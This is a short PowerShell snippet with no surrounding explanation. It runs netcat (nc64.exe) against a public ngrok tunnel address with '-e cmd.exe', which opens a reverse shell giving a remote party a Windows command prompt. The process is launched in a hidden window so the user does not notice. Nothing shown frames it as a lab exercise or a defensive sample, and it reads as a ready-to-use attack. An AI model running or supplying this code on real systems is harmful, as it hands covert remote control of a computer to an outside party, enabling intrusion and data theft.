$command = ".\nc64.exe 2.tcp.eu.ngrok.io 13522 -e cmd.exe"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden
